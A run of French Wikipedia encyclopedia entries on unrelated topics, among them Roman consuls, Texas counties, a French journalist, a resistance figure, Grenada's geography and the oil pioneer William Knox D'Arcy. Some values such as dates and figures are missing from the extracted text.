Quintus Valerius Falto est un homme politique et un général de la République romaine durant et après la première guerre punique. Il est le frère de Publius Valerius Falto (consul en 238 av. J.-C.).
Biographie.
En 242 av. J.-C., il est préteur, tandis que le consul Aulus Postumius Albinus qui est flamine de Mars se voit interdire par le "pontifex maximus" de quitter la ville de Rome en raison de ses devoirs religieux. Valerius Falto, qui détient aussi un "imperium" a le droit de commandement militaire, remplace ce consul et accompagne l'autre consul Caius Lutatius Catulus pour mener la guerre en Sicile. Avec une flotte nouvellement construite, ils investissent par mer et par terre Drépane, une des dernières places fortes carthaginoises qui résiste depuis près de dix ans. Lutatius est gravement blessé lors du siège, Valerius Falto assume alors le commandement de l'armée.
En mars 241 av. J.-C., il bat aux îles Égates la flotte de ravitaillement et de renfort des Carthaginois, victoire qui met fin à la première guerre punique.
En octobre 241 av. J.-C. à Rome, Valérius conteste à Lutatius Catulus le droit de recevoir les honneurs du triomphe. Valérius revendique le triomphe pour avoir dirigé personnellement la bataille tandis que Catulus, blessé, était alité. Choisi comme arbitre, l'ancien consul Aulus Atilius Calatinus accorde le triomphe à Lutatius, dans la mesure où le consul à la responsabilité supérieure du commandement et des augures sur le préteur.
Néanmoins, Valérius se voit accorder par le peuple le triomphe le 6 octobre 241 av. J.-C., deux jours après celui de Lutatius.
En 239 av. J.-C., il est consul.

</doc>
<doc id="1872759" url="https://fr.wikipedia.org/wiki?curid=1872759" title="François-Xavier Nguyên Van Thuân">
François-Xavier Nguyên Van Thuân



</doc>
<doc id="1872760" url="https://fr.wikipedia.org/wiki?curid=1872760" title="Publius Valerius Falto">
Publius Valerius Falto

Publius Valerius Falto, frère de Quintus Valerius Falto (consul en 239 av. J.-C.), est un chef de guerre et homme politique membre de la famille patricienne des Valerii.
En 238 av. J.-C., il est consul.

</doc>
<doc id="1872763" url="https://fr.wikipedia.org/wiki?curid=1872763" title="La Mémoire dans la peau (téléfilm)">
La Mémoire dans la peau (téléfilm)

La Mémoire dans la peau ("The Bourne Identity") est un téléfilm américain réalisé par Roger Young diffusé en deux parties en 1988 aux États-Unis sur ABC. En France, il fut diffusé en 1989 sur TF1.
Synopsis.
Jason Bourne est amnésique et ignore qui il est. Cependant, il se découvre rapidement des capacités étonnantes : techniques de combat, maniement des armes et un sang-froid à toute épreuve. Tous ces talents vont lui servir car plusieurs personnes sont à ses trousses...

</doc>
<doc id="1872765" url="https://fr.wikipedia.org/wiki?curid=1872765" title="Ancien grec">
Ancien grec



</doc>
<doc id="1872767" url="https://fr.wikipedia.org/wiki?curid=1872767" title="Death to Spies">
Death to Spies

Death to Spies est un jeu vidéo d'action et d'infiltration sorti en 2007 sur PC. Le jeu a été développé par Haggard Games et édité par 1C Company.
Il a pour suite "".
Système de jeu.
Le jeu propose une série de missions où le joueur sera amené à effectuer diverses tâches (libérer un prisonnier, récupérer des documents, assassiner un officier, etc.). Le jeu reprend les mécaniques de la série Hitman. Le joueur est lâché sur une carte afin d'accomplir une série d'objectifs et peut à sa guise jouer la carte de la discrétion ou bien foncer dans le tas. Comme dans la série Hitman, le système de discrétion repose sur des costumes. Enfiler le costume d'un soldat lambda vous procura une certaine aisance de déplacements car une partie des PNJ ne sera plus en mesure de démasquer notre personnage tandis que certaines portions du jeu resteront inaccessibles à moins de se procurer un costume d'un plus haut gradé. Il faut également faire attention aux armes que l'on possède et que l'on met en évidence sous peine d'être démasqué; par exemple les soldats allemands trouveront suspect que le joueur soit en possession d'un PPSh.

</doc>
<doc id="1872768" url="https://fr.wikipedia.org/wiki?curid=1872768" title="Kyle Petty">
Kyle Petty

Kyle Petty (né le à Randleman, en Caroline du Nord) est un pilote automobile américain de NASCAR disputant la Sprint Cup. Il pilote la voiture .
Biographie.
Kyle Petty fait partie d'une grande famille du sport automobile américain, son grand-père (Lee Petty), son père (Richard Petty) et son fils (Adam Petty) ont été aussi pilotes en Nascar.

</doc>
<doc id="1872770" url="https://fr.wikipedia.org/wiki?curid=1872770" title="Casimir III de Poméranie">
Casimir III de Poméranie

Casimir III de Poméranie (en polonais "Kazimierz III", en allemand "Kasimir III."), connu aussi sous le nom de Casimir III de Szczecin, est né vers 1348 et il est mort le . Il est duc de Poméranie (Duché de Szczecin).
Casimir III est le fils de Barnim III le Grand et d’Agnès, la fille du duc Henri II de Brunswick-Grubenhagen. Il est le frère ainé de Świętobór I et de Bogusław VII. De 1357 à 1367, il est éduqué à la cour de Charles IV à Prague.
Au cours de la seconde moitié du , la Poméranie se décompose. Les villes hanséatiques mènent leur propre politique, entrent en conflit avec le Danemark, sans que les ducs poméraniens ne puissent intervenir efficacement dans les évènements. Après les décès de Barnim IV (le duc de Wolgast et de Rügen) en 1365 et de Barnim III le Grand (le duc de Szczecin) en 1368, la Poméranie est divisée entre les héritiers et s’affaiblit.
Les jeunes ducs de Szczecin doivent immédiatement faire face à des attaques du margrave de Brandebourg dans le Neumark et dans l’Uckermark. Un cessez-le-feu intervient en 1369. À la suite de l’intervention de Valdemar IV de Danemark, ils sont contraints d’abandonner l’Uckermark dans un traité de paix signé avec le Brandebourg le .
Avec la reprise des combats dans le Neumark et dans l’Uckermark, les ducs de Szczecin s’allient avec le Mecklembourg le .
Assiégé à Chojna, dans le Neumark, Casimir III est gravement blessé et meurt quelques jours plus tard à Szczecin, le . Il y est inhumé dans l’église Saint-Othon.

</doc>
<doc id="1872773" url="https://fr.wikipedia.org/wiki?curid=1872773" title="Le Ballon blanc">
Le Ballon blanc

Le Ballon blanc est un film dramatique iranien réalisé par Jafar Panahi et sorti en 1995. Le scénario du film est signé par Abbas Kiarostami.
Le film remporte la Caméra d'or au Festival de Cannes 1995.
Le journal britannique "The Guardian" a élu ce film comme l'un des meilleurs films familiaux.
Synopsis.
Razieh veut un beau poisson rouge bien dodu pour la nouvelle année. Elle trouve ces poissons gracieux avec leur grandes nageoires, ils dansent dans le bocal, pas comme les petits poissons rouges maigrelets de sa mère. Razieh peine à obtenir de sa mère l’argent pour le poisson, mais grâce à son frère, sa mère lui confie un billet de 500 dont elle devra ramener la monnaie. Mais en allant l'acheter, la petite fille perd le billet. Et il sera très dur à retrouver. Razieh devra vivre beaucoup d'aventures avant d'arriver à ses fins.

</doc>
<doc id="1872776" url="https://fr.wikipedia.org/wiki?curid=1872776" title="Casimir III de Szczecin">
Casimir III de Szczecin



</doc>
<doc id="1872787" url="https://fr.wikipedia.org/wiki?curid=1872787" title="Comté de Hockley">
Comté de Hockley

Le comté de Hockley, en "", est un comté situé dans le nord-ouest de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Levelland. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est nommé en l'honneur de , le secrétaire de guerre de la république du Texas.
Organisation du comté.
Le comté est fondé le à partir des terres du comté de Young. Il reste attaché à ce comté, pour l'aspect judiciaire puis en est détaché, le , pour être rattaché successivement aux comtés de Baylor, puis de Crosby, de Hale et enfin celui de Lubbock. Il est définitivement organisé et rendu autonome, le . 
Le comté est baptisé en référence à , chef d'état-major de l'armée du Texas pendant la révolution texane. Il exerce plus tard, la fonction de secrétaire de guerre de la république du Texas.
Géographie.
Le comté de Hockley se situe au nord-ouest de l'État du Texas, aux États-Unis. Il fait partie de la région de l'ouest du Texas, au sud du Texas Panhandle et dans le Llano Estacado.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . Elle est estimée, en 2017, à .

</doc>
<doc id="1872792" url="https://fr.wikipedia.org/wiki?curid=1872792" title="Œil de verre">
Œil de verre



</doc>
<doc id="1872794" url="https://fr.wikipedia.org/wiki?curid=1872794" title="Oeil de verre">
Oeil de verre



</doc>
<doc id="1872798" url="https://fr.wikipedia.org/wiki?curid=1872798" title="Nicolas Charbonneau">
Nicolas Charbonneau

Nicolas Charbonneau est journaliste et dirigeant de médias français né le à Chablis (Yonne). Il est actuellement directeur des rédactions du "Parisien/Aujourd'hui en France".
Il est administrateur et vice-président du Press Club de France.
Biographie.
Diplômé de sociologie de la communication et sociologie politique à l'université Paris-IV-Sorbonne, Nicolas Charbonneau devient grand-reporter à Europe 1, présentateur de journaux radio et TV, rédacteur en chef de plusieurs médias dont "Le Parisien" et directeur adjoint de l'Information du groupe TF1.
Il est nommé directeur délégué des rédactions du "Parisien/Aujourd’hui en France" en . Il est nommé directeur des rédactions en septembre 2022.
Radio.
Pendant plus de 15 ans, il couvre pour la station de radio Europe 1 des événements internationaux comme le génocide au Rwanda, la reprise des essais nucléaires en Polynésie, la guerre du Kosovo, la famine en Éthiopie, la mort de Pinochet au Chili, l'après-Mandela en Afrique du Sud, la prise d'otages de Jolo...
Il présente ensuite les journaux du matin sur Europe 1 jusqu'en .
Presse écrite.
En , il quitte Europe 1 pour présenter la tranche 22 h - minuit sur la chaîne d'information en continu i&gt;Télé, puis Nicolas Charbonneau est nommé rédacteur en chef de i&gt;Télé par Thierry Thuillier.
En , il est appelé par Marie-Odile Amaury, présidente du groupe Amaury et Noël Couëdel alors directeur éditorial pour devenir rédacteur en chef du quotidien "Le Parisien/Aujourd'hui en France".
En , il revient au "Parisien/Aujourd'hui en France" comme directeur délégué des rédactions. En septembre 2022 il devient directeur des redactions.
Selon "La Lettre A", « sa reprise en main musclée du quotidien et ses éditoriaux ont toutefois suscité la fronde d'une partie de la rédaction, qui redoute une inflexion de la ligne vers le credo du journalisme d'opinion. » La Société des journalistes (SDJ) du "Parisien" a notamment émis en mars 2023 un communiqué critiquant l'engagement du journal en faveur de la réforme des retraites du gouvernement.
Télévision.
Dès 2001, avec Jérôme Bellay (alors président d'Europe 1) et Yves Calvi, Nicolas Charbonneau est l'un des fondateurs de l'émission "C dans l'air" sur France 5.
En , Nonce Paolini, président de TF1, et Catherine Nayl, directrice générale déléguée à l'Information le nomment directeur adjoint de l'Information de TF1.
De à la rentrée 2016, il est également directeur général de LCI, la Chaîne d'Information du groupe TF1.

</doc>
<doc id="1872800" url="https://fr.wikipedia.org/wiki?curid=1872800" title="Comté de Hood">
Comté de Hood

Le comté de Hood, en "", est un comté situé au nord des plaines du centre, dans la région des Cross Timbers de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Granbury. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont de surfaces terrestres. Le comté de Hood est baptisé en référence à John Bell Hood, général de l'Armée des États confédérés.
Organisation du comté.
Le comté est fondé le , à partir des terres des comtés d'Erath, de Johnson et de Palo Pinto. Il est définitivement organisé et autonome le . 
Il est baptisé en l'honneur de John Bell Hood, général de l'Armée des États confédérés, commandant de la Brigade du Texas, également appelée "brigade de Hood".
Géographie - Climat.
Le comté de Hood est situé au nord des plaines du centre, dans la région des Cross Timbers au Texas, aux États-Unis.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
Les altitudes vont de à . Le fleuve Brazos et la rivière Paluxy sont les principales sources d'eau du comté. Le Brazos coule en un mouvement sinueux du nord au sud tandis que le Paluxy coule du nord-ouest au sud-est en passant par le coin sud-ouest du comté. Le , un réservoir situé sur le fleuve Brazos, a été achevé en 1969. Les précipitations annuelles moyennes sont de .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . Elle est estimée, en 2017, à .

</doc>
<doc id="1872801" url="https://fr.wikipedia.org/wiki?curid=1872801" title="Glaucosphaera (algue)">
Glaucosphaera (algue)

Glaucosphaera est un genre d’algues rouges unicellulaires de la famille des "Glaucosphaeraceae".
Liste d'espèces.
Selon , et :

</doc>
<doc id="1872806" url="https://fr.wikipedia.org/wiki?curid=1872806" title="Équipement d'exploitation de la route">
Équipement d'exploitation de la route

Les équipements d'exploitation de la route sont principalement au service des causes suivantes :
Les types d’équipements d’exploitation de la route.
La surveillance de la circulation et la connaissance de l'état du trafic.
Il s’agit principalement des équipements suivants :
La centralisation des informations.
La centralisation des informations facilite à l'exploitant la prise de décisions appropriées (par exemple l'envoi d'équipes sur le terrain, la mise en œuvre de mesures de gestion de trafic),
Il s’agit principalement de centres de gestion de trafic.
L’information des usagers.
La restitution en temps réel aux usagers des informations ainsi recueillies se fait à l'aide de
Les systèmes de transports intelligents.
Il s’agit là de systèmes intégrés regroupant l’ensemble des types d’équipements définis ci-dessus assistés de systèmes experts visant une exploitation dynamique optimisée des routes.
Les objectifs de l’exploitation de la route.
Contribuer à la sécurité routière.
La surveillance du réseau routier, qui contribue à détecter dans de brefs délais des anomalies ou des défauts d'entretien susceptibles d'entraîner des accidents, permet de rendre les routes plus sûres. Il en est de même d’une intervention rapide des équipes d'exploitation pour la remise en état des routes après des accidents.
L'organisation méthodique de l'activité de rétablissement de la viabilité lors des intempéries hivernales, permet d'éviter de nombreux accidents dus aux chaussées glissantes, notamment en cas de verglas.
Les systèmes d'exploitation et de gestion de trafic permettent une meilleure connaissance des évènements, facilitant ainsi la prise de décisions rapides en vue de rétablir au plus vite la sécurité des usagers.
L'information sur la présence de bouchons ou d'accidents, permet à l'usager d'adapter sa conduite et d'éviter les sur-accidents ou accidents de « queue de bouchon »,
La délivrance d'informations fiables contribue à réduire le stress du conducteur et à apaiser sa conduite.
Le réseau d'appel d'urgence facilite un contact très rapide entre les victimes et les secours, ce qui constitue un gage de soin rapide aux accidentés,
Contribuer à la fluidité de la circulation.
Grâce à l'information sur les temps de parcours et sur la présence d'encombrements ainsi qu’aux conseils d'itinéraires, l'usager peut adapter sa stratégie de déplacement, soit en modifiant son itinéraire, soit en différant ses déplacements, voire en choisissant un autre mode de déplacement.
Les mesures de gestion de trafic prédéfinies dans le cadre de « plans de gestion de trafic » permettent de réduire les conséquences de crises ayant un impact majeur sur la circulation (accidents graves, épisodes neigeux exceptionnels…)
Les équipements d'exploitation et de gestion de trafic permettent une meilleure répartition des flux de déplacement dans le temps et sur les différents réseaux. Ils contribuent ainsi à réduire le temps perdu dans les embouteillages, ce qui constitue un gain économique important.

</doc>
<doc id="1872807" url="https://fr.wikipedia.org/wiki?curid=1872807" title="Georges Zérapha">
Georges Zérapha

Elie, Léon, Isaac Zerapha connu sous le nom de Georges Zérapha (, Alger - , Balagny-sur-Thérain), homme d'affaires français de confession juive, membre fondateur d"'Esprit", de la Ligue internationale contre le racisme et l’antisémitisme (LICRA), et du mouvement de résistance Libération-Sud.
Biographie.
En novembre 1940 à Clermont-Ferrand, il jette les bases d'un mouvement de Résistance avec Emmanuel d'Astier de La Vigerie, Lucie Samuel (qui deviendra Lucie Aubrac) et Jean Cavaillès. Celui-ci se structure au premier semestre 1941 à Lyon jusqu'à son premier fait d'armes : l'édition d'un journal nommé "Libération", qui sort son premier numéro en juillet 1941 à 5000 exemplaires, à l'occasion duquel le mouvement prend définitivement le nom de Libération-Sud. En désaccord avec les méthodes "autocratiques" du leader du mouvement d'Astier, Georges Zerapha quittera le mouvement en 1942.
Il rallie Londres en 1943 puis retourne en France en 1944 pour monter un réseau de renseignement militaires.
Pendant plusieurs années jusqu’en 1939, il a permis à "Esprit" de surmonter sa situation financière par des donations et en lui mettant à disposition un local et un secrétariat.
En 1920, Georges Zérapha acquiert, comme banquier d’affaires, des actions de la Société française des papiers peints, usine établie à Balagny-sur-Thérain en . Bien que minoritaire, il décide avec sa femme Cathy de relever l’entreprise. Il en devient le Président directeur général et s’installe lui-même à Balagny-sur-Thérain. Malgré des progrès techniques indéniables, les années 1920-1930 sont assez difficiles car le consommateur se détourne du papier peint, représenté en grande partie par des productions bon marché, au profit de la peinture. À travers ses Éditions d’art Essef, Georges Zérapha, désireux de développer son entreprise, fait appel à des créateurs de renom, tels Jacques-Émile Ruhlmann, Louis Sue, André Mare, Primavera, Suzanne Fonta, René Crevel qui conçoivent des modèles tranchant sur l’ensemble de la production. Il assied ainsi la réputation de la manufacture. Lors de l’invasion des Allemands en 1940, Georges Zérapha et sa famille doivent s’éloigner car ils sont recherchés par les Nazis. L’usine connaît alors un demi-sommeil accentué par sa transformation partielle en dépôt de matériel militaire. Le site est détruit par les Allemands à leur départ. En 1946, Georges Zérapha qui a passé la Guerre dans les réseaux de résistance, décide, malgré les dommages, de relancer l’entreprise. Il restaure les installations, adopte les techniques nouvelles, investit dans la création avec l’aide de son épouse pour redonner aux collections le lustre nécessaire à leur réussite. L’usine remontée, des Éditions d’art, collections de prestige destinées au grand public, sont publiées sous la marque SANITEX de 1948 à 1952. S’y côtoient le dessin « Lendemain de fête » de Léonor Fini, des esquisses de Maurice Brianchon, Jacques Flandin, René Fumeron, Colette Guéden, Simone Godquin, Odette Martin Girard, Gilbert Poillerat, Raymond Peynet…
De 1933 à 1939 puis en 1945, il a publié de nombreux articles dans la revue "Esprit".
Georges Zérapha en 1938 dans un article de "La Revue juive de Genève", analyse la propagande d'Hitler comme une « première victoire » des antisémites.
Dans son article « le cauchemar du hibou », une réflexion sur le songe d’un Céline sombre et misanthrope, Georges Zérapha, qualifiait Bagatelles pour un massacre de « jaillissement irresponsable d'une âme malade vers un fantôme ».
Il a publié « Notre combat contre l'antisémitisme », avec une préface de Bernard Lecache, et de nombreux articles dans le journal de la LIC(R)A, "Le Droit de Vivre".
A la fin de la guerre d'Algérie, le 26 décembre 1961, il prend position dans le quotidien "Combat" pour la solution d'un partage de l'Algérie, idée transpartisane alors en vogue défendue entre autres par le futur prix Nobel d'économie Maurice Allais, les hommes politiques Alain Peyrefitte (gaulliste) ou Patrice Brocas (radical-socialiste), l'organisation de gauche socialiste "Patrie et Progrès" ainsi que par une fraction minoritaire de l'OAS partisane d'une négociation sur cette base. Critique envers la politique algérienne du général de Gaulle et de son gouvernement, qui ne tend selon lui « à rien moins qu'à chasser d'Algérie les Français de toutes confessions », et reprochant aux « partisans de l'abandon de l'Algérie au F.L.N. » leur « aveuglement sectaire » et « les slogans pacifistes anesthés[iants] », il prône ce qu'il nomme « la décolonisation par le partage », soit une Algérie divisée entre un Etat arabe indépendant sur la majeure partie de son territoire et le maintien sur une portion du littoral méditerranéen d'« un département français issu du partage » dans lequel des « hommes de toutes confessions (y compris les musulmans) veulent rester français sur une terre française ».
Bibliographie.
Citations de Georges Zérapha.
« L'antisémitisme croit poser la question juive sur le terrain politique et social ; en réalité, et sans le savoir, il pose la question juive sur son vrai plan métaphysique de l'élection du peuple juif. »
« Sans Hitler, les mêmes proscrits de l'antisémitisme et de Mussolini passaient inaperçus. Hitler, génie démagogique, ne s'est pas contenté de persécuter physiquement certaines catégories d’hommes, de femmes et d'enfants, il les a désignés à la haine du monde par une propagande de calomnie qui a produit ses effets. Hitler n'a pas agi seulement sur les Allemands, son influence s'est exercée dans de larges couches des nations démocratiques. Cette influence se traduit par des sentiments complexes : sympathie aux croisades prétendument anticommunistes, sympathie aux idées nationalistes, aux tendances fascistes, complaisance aux idées antisémites, crainte vague de déplaire à la belliqueuse Allemagne, complaisance à la calomnie »…

</doc>
<doc id="1872809" url="https://fr.wikipedia.org/wiki?curid=1872809" title="Le Guépiot">
Le Guépiot

Le Guépiot est un film français réalisé par Joska Pilissy, sorti en 1981.

</doc>
<doc id="1872811" url="https://fr.wikipedia.org/wiki?curid=1872811" title="Perles">
Perles



</doc>
<doc id="1872814" url="https://fr.wikipedia.org/wiki?curid=1872814" title="Comté de Hopkins (Texas)">
Comté de Hopkins (Texas)

Le comté de Hopkins, en "", est un comté situé dans le nord-est de l'État du Texas aux États-Unis. Il est nommé en l'honneur de David Hopkins, un des premiers colons de la région. Le siège du comté est Sulphur Springs. Selon le recensement de 2020, sa population est de .
Le comté a une superficie de , dont en surfaces terrestres. 

</doc>
<doc id="1872818" url="https://fr.wikipedia.org/wiki?curid=1872818" title="Saskia Cohen-Tanugi">
Saskia Cohen-Tanugi

Saskia Cohen-Tanugi, née le à Tunis et morte le à Jérusalem, était une metteur en scène française de théâtre, également dramaturge, professeure de théâtre et scénariste. Elle était aussi actrice, ayant joué entre autres dans un remake de James Bond avec Sean Connery, "Jamais plus jamais", en 1983.
Biographie.
Elle est diplômée de l'Université hébraïque de Jérusalem, de l'Université Sorbonne-Paris III (Master), et du Conservatoire national supérieur d'art dramatique.
À la demande de son professeur de littérature, elle crée son premier spectacle à 16 ans : "Alice au pays des merveilles". En 1977, elle met en scène au théâtre du Rio, avec un groupe de jeunes acteurs comme Danuta Zarazik, Fred Serra, Marie Maffre, une série de spectacles courts, sur différents thèmes. Le " Labyrinthe" est écrit à partir de textes de cinéma. La révolte du ghetto de Varsovie est mise en scène à partir de documents historiques.
Par l'intermédiaire de son professeur de russe, elle fait un voyage d'étude de plusieurs semaines, à Moscou et Leningrad. Puis après un an d'étude en Architecture et une formation dans les classes de Daniel Mesguich, elle rentre au Conservatoire national supérieur d'art dramatique, où elle étudie sous la direction d'Antoine Vitez, Pierre Debauche, J.P Miquel et P. Vial. Au conservatoire, elle crée pour Nathalie Becue, "Roméo et Juliette" qu'elle traduit et adapte en rajoutant des personnages afin de distribuer un nombre supérieur de rôles à ses camarades de promotion. Puis, après avoir travaillé sous la direction de Jean Pierre Klein, elle prépare une performance sur la punkitude.
Elle part suivre en Angleterre une formation au théâtre shakespearien. Valérie Quennessen et Remi Kolpa Kopoul deviennent ses références musicales. Elle rentre à Libération et publie plusieurs articles en double pages sur la musique anglaise. À sa sortie du conservatoire elle participe au tournage de "Jamais plus jamais", un James Bond avec Sean Connery, Bernie Casey, Barbara Carrera, Klaus Maria Brandauer, Kim Basinger et Max von Sydow dirigés par Irvin Kershner. Puis elle met en scène "le Marchand de Venise" au TGP.
En 1984 elle écrit une œuvre théâtrale de science-fiction sur le thème de l'eau, produite par le festival d'Avignon. Elle suit un stage à l'école de formation des officiers de Saint-Cyr Coëtquidan et crée "Technique pour un coup d'État" avec dans le rôle principal Jean-Marc Barr. Elle participe à la préparation d'une œuvre théâtrale sur les Refuzniks.
En 1988, elle part pour la Nouvelle-Calédonie où elle travaille pendant plus d'une année à la préparation du festival des arts du Pacifique. Cent kanaks et mélanésiens représentant la grande terre, Lifou et Maré participeront à cette œuvre représentant la culture contemporaine et la tradition retransmise par les anciens. À la demande de Christian Blanc, elle travaille à l'élaboration d'une « Maison de la Ratp ». Elle met en scène au studio des Champs-Élysées Élisabeth Depardieu et Jean Michel Dupuis, dans l'œuvre du Soviétique . Gérard Depardieu soutient ce travail artistique et propose la production d'un film sur Naples à partir d'un scénario qu'elle écrit sur la ville italienne.
Elle travaille en collaboration avec Patrick Grandperret, à l'écriture d'un scénario sur l'Afrique contemporaine, puis avec Xavier Castano a l'écriture de "Veraz", dont le rôle principal est interprété par Kirk Douglas. Bernardo Bertolucci lui demande de travailler sur "Little Buddha". En parallèle, elle commence un travail sur Ibn Gabirol et les auteurs judéo-espagnols de l'âge d'or séfarade. Elle est chargée par de la responsabilité de la programmation d'un théâtre d'arrondissement dans la ville de Paris. Elle travaille à l'élaboration de l'œuvre théâtrale "Le Vieil Homme et le Molosse" pour Greg Germain.
En 1998 elle participe à l'écriture d'un scénario sur Musset et George Sand pour Diane Kurys. En 1999 elle adapte "Mademoiselle Else" d'Arthur Schnitzler, pour le théâtre. Cette œuvre est récompensée par plusieurs Molière.
En 2000 elle est responsable d'un atelier de théâtre à l'université hébraïque de Jérusalem. Elle écrit plusieurs œuvres sur le Proche-Orient dont "Caleb et Yoshua", "Judith Epstein", "La Vieille Femme du 55 rue Gabirol", "Les Deux Jeunes Filles de Netanya", "Avant qu'Ophélie ne...," "Lettres d'intifada", le journal, lettres à Élisabeth, elle traduit et publie plusieurs articles sur l'art moderne au Proche-Orient dans les colonnes culturelles de différents journaux.
Filmographie.
Scénariste.
Elle participe à l'écriture de "Little Buddha" de Bernardo Bertolucci.
Elle participe au groupe d'écriture du scénario des "Enfants du siècle" de Diane Kurys.

</doc>
<doc id="1872821" url="https://fr.wikipedia.org/wiki?curid=1872821" title="LKPR">
LKPR



</doc>
<doc id="1872830" url="https://fr.wikipedia.org/wiki?curid=1872830" title="Ordre d'Alcantara">
Ordre d'Alcantara



</doc>
<doc id="1872834" url="https://fr.wikipedia.org/wiki?curid=1872834" title="Giuseppe Gioacchino Belli">
Giuseppe Gioacchino Belli



</doc>
<doc id="1872835" url="https://fr.wikipedia.org/wiki?curid=1872835" title="Géographie de la Grenade">
Géographie de la Grenade

La Grenade est un pays composé de l'île principale, la Grenade, et de quelques îles des Grenadines. Ces îles sont situées dans les Antilles au nord de Trinité-et-Tobago à environ des côtes vénézuéliennes.
Île de la Grenade.
L'île mesure environ de long pour de large. Située en mer des Caraïbes, elle est d'origine volcanique ce qui explique les nombreux reliefs de son territoire. Le point culminant de l'île est le mont Sainte-Catherine (). Comme dans l'île de la Dominique, la Grenade possède plusieurs lacs de cratère dont à d'altitude, le ou le lac Antoine, qui constituent les deux plus grandes étendues d'eau douce sur l'île.
Autres îles.
Outre l'île principale de la Grenade, les îles habitées sont :
Il existe également d'autres îles Grenadines inhabitées de moindre importance :
Volcan sous-marin.
Le Kick-'em-Jenny est un volcan sous-marin de la mer des Caraïbes, situé à au nord de l'île de Grenade et à environ à l'ouest de l'île Ronde. Le mont s'élève à au-dessus du fond de la mer ; son sommet est à de profondeur. Le premier enregistrement du volcan date de 1939, bien qu'il ait dû entrer en éruption de nombreuses fois avant cette date.
Réserves forestières.
Les sont des aires protégées contiguës situées dans les montagnes intérieures du centre-sud de la Grenade. Elles englobent la plus grande zone terrestre protégée de la Grenade, suivie de la .
Climat.
Il s'agit d'un climat de type tropical, caractérisé par une saison sèche allant de janvier à avril et une saison des pluies allant de juin à novembre. Lors de la saison des pluies, on compte en moyenne 22 jours de pluie par mois à Saint-Georges, la capitale (12 en saison sèche).
Les températures sont de l'ordre de 24 à en janvier, et de 25 à en juillet.
Principales villes.
Les principales villes de la Grenade sont (du nord au sud dans le sens horaire) : Sauteurs, Tivoli, Grenville, Marquis, Saint Davids, Calivigny, Belmont, Saint-Georges (la capitale), Grand Roy, Gouyave, Victoria.

</doc>
<doc id="1872836" url="https://fr.wikipedia.org/wiki?curid=1872836" title="William Knox D'Arcy">
William Knox D'Arcy

William Knox D'Arcy est un homme d'affaires britannique né le à Newton Abbot et mort le à Stanmore. Il est l'un des principaux pionniers de l'industrie pétrolière et pétrochimique en Iran. Il a été directeur de l'Anglo-Persian Oil Company, ancêtre de la British Petroleum (BP). Il est surtout connu pour son rôle dans la naissance de la compagnie pétrolière .
Jeunesse.
Il est né à Newton Abbot, en Angleterre, fils d'un avocat. Il a fréquenté l'école de Westminster jusqu'en 1866, lorsque la famille émigra en Australie, dans le Queensland, après la faillite de son père, et s'installa à Rockhampton. D'Arcy travailla dans un premier temps avec son père. L'expérience s'est bien passée et il a commencé à spéculer, d'abord dans la terre.
Il a épousé Elena Birkbeck de Rockhampton à la cathédrale Saint-Patrick, Parramatta le . Elena est née au Mexique en 1840, la seule fille de Damian de Barre Valdez et Samual Birkbeck, ingénieur minier de l'Illinois. Elle était descendante des Birkbeck anglais, une famille Quaker intéressée par l'éducation.
Travail en Australie et Nouvelle-Zélande.
En 1882, il devient partenaire avec Walter Russell Hall et Thomas Skarratt Hall, dans un syndicat avec Thomas, Frederick et Edwin Morgan lorsqu'ils ouvrent une mine sur Ironstone Mountain, dans le Queensland, à 24 miles (39 km) au sud de Rockhampton. Il y a eu un dépôt important à Mt Morgan. En octobre 1886, la Morgan Morgan Mining Company, avec D'Arcy et le plus grand actionnaire. Il détenait 125 000 actions en son nom et 233 000 en fiducie. À un moment donné, le prix des actions a augmenté rapidement d'un à 17 livres. (D'Arcy était devenu millionnaire avec un montant équivalant à £ 603 millions en termes actuels ). La société a également travaillé sur une mine d'or riche à Matakanui, Central Otago, en Nouvelle-Zélande, par l'intermédiaire de sa filiale Mount Morgan Sluicing Company.
De retour en Angleterre.
D'Arcy cessa sa pratique du droit et revint en 1872 en Angleterre. Knox a également eu d' importantes maisons à Londres, 42 Grosvenor Square, ainsi qu'à Paris et à Bruxelles. En 1885, le marché boursier avait ouvert et attiré les plus grandes dynasties financières du monde après Londres tel. B. Hirsch, d'Erlanger, Rothschild, Bischoffsheim, Lazard, Seligman, Speyer et étoiles. D'Arcy les a invités tous, il avait un box à la Royal Opera House de Londres et ses invités pouvaient admirer Nellie Melba et Enrico Caruso. Même pour les courses de chevaux à Epsom, il avait sonbox. Il voyagea à Marienbad (aujourd'hui en Tchéquie) pour se reposer et chasser, il possédait aussi "Bylaugh park", une maison à Norfolk. 
Il a acheté "Stanmore Hall",  un impressionnant édifice du Middlesex et il a chargé l'architecte Brightwen Binyon (1846-1905) , aidé de William Morris et Edward Burne-Jones,  de la décoration. Une série de tapisseries « "La quête du Graal" » ont été accrochées dans le hall d'entrée et l'escalier. 
La hausse du coût de son nouveau style de vie et la baisse des paiements de dividendes de ses actions australiennes commencèrent à faire fondre sa fortune.
La concession pétrolière persane.
En 1900 Sir Henry Drummond Wolff, un homme politique britannique, diplomate et ancien ambassadeur britannique à Téhéran, le convainc de chercher en Perse du pétrole. D'Arcy acquiert le par Mozaffaredin Shah une concession pour , 10 % du capital dans les futurs revenus d'une « société d' abord la collecte » et une participation aux bénéfices de 16 %, pour une superficie de carrés (75 % de la superficie de la Perse) pour une période de . Après l'expiration de la concession, le total des actifs immobiliers de la société doit revenir à l'Etat iranien. Les concessionnaires en question ont également l'impôt sur le revenu iranien. D'Arcy accepte d'assumer tous les coûts de développement.
